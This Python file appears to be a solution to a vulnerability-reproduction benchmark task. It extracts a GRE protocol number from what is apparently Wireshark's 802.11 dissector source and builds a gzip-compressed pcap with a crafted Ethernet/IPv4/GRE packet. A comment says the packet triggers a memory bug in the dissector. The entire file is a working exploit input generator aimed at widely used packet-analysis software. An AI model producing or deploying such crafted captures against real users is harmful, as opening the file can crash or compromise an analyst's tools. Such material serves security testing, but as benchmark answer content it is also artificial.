import tarfile
import re
import struct
import io
import gzip

class Solution:
    def solve(self, src_path: str) -> bytes:
        target_proto = 0x88bb  # Default fallback

        try:
            with tarfile.open(src_path, 'r') as tar:
                ieee80211_content = ""
                etypes_content = ""
                
                # Iterate through tar members to find relevant files
                for member in tar.getmembers():
                    if member.name.endswith('packet-ieee80211.c'):
                        f = tar.extractfile(member)
                        if f:
                            ieee80211_content = f.read().decode('utf-8', errors='ignore')
                    elif member.name.endswith('etypes.h'):
                        f = tar.extractfile(member)
                        if f:
                            etypes_content = f.read().decode('utf-8', errors='ignore')

                # Logic to extract the protocol ID registered in gre.proto
                if ieee80211_content:
                    pattern = r'dissector_add_uint\s*\(\s*"gre\.proto"\s*,\s*([A-Za-z0-9_]+|0x[0-9a-fA-F]+|\d+)'
                    match = re.search(pattern, ieee80211_content)
                    if match:
                        val_str = match.group(1).strip()
                        
                        # Helper to resolve value
                        def resolve_val(s, content_list):
                            # Try integer literal
                            if s.isdigit():
                                return int(s)
                            if s.lower().startswith('0x'):
                                return int(s, 16)
                            
                            # Try finding #define in contents
                            def_pattern = r'#define\s+' + re.escape(s) + r'\s+(0x[0-9a-fA-F]+|\d+)'
                            for content in content_list:
                                if content:
                                    m = re.search(def_pattern, content)
                                    if m:
                                        ds = m.group(1).strip()
                                        if ds.lower().startswith('0x'):
                                            return int(ds, 16)
                                        return int(ds)
                            return None

                        resolved = resolve_val(val_str, [ieee80211_content, etypes_content])
                        if resolved is not None:
                            target_proto = resolved

        except Exception:
            pass

        # Build Packet: Eth / IP / GRE / Payload
        # Ethernet Header (14 bytes)
        eth = struct.pack('!6s6sH', b'\x00'*6, b'\x00'*6, 0x0800)
        
        # IP Header (20 bytes)
        # Total Length: 20 (IP) + 4 (GRE) + 1 (Payload) = 25
        ip_len = 25
        # 0x45 = IPv4, IHL=5. 0x40 = TTL 64. 0x2f = Proto 47 (GRE).
        ip_header = bytearray(struct.pack('!BBHHHBBH4s4s', 
            0x45, 0, ip_len, 0, 0, 0x40, 0x2f, 0, 
            b'\x7f\x00\x00\x01', b'\x7f\x00\x00\x01'))
        
        # IP Checksum
        s = 0
        for i in range(0, 20, 2):
            w = (ip_header[i] << 8) + ip_header[i+1]
            s += w
        while (s >> 16):
            s = (s & 0xffff) + (s >> 16)
        s = ~s & 0xffff
        struct.pack_into('!H', ip_header, 10, s)
        
        # GRE Header (4 bytes)
        # Flags=0, Proto=target_proto
        # GRE flags/ver (0) passed as data pointer causes the vulnerability
        gre = struct.pack('!HH', 0, target_proto)
        
        # Payload (1 byte)
        payload = b'\x00'
        
        packet_data = eth + ip_header + gre + payload
        
        # PCAP Structure
        # Global Header: LE, DLT=1 (Ethernet)
        gh = struct.pack('<IHHIIII', 0xa1b2c3d4, 2, 4, 0, 0, 65535, 1)
        # Packet Header: LE
        ph = struct.pack('<IIII', 0, 0, len(packet_data), len(packet_data))
        
        pcap = gh + ph + packet_data
        
        # Compress using gzip (deterministic mtime)
        out = io.BytesIO()
        with gzip.GzipFile(fileobj=out, mode='wb', compresslevel=9, mtime=0) as f:
            f.write(pcap)
            
        return out.getvalue()
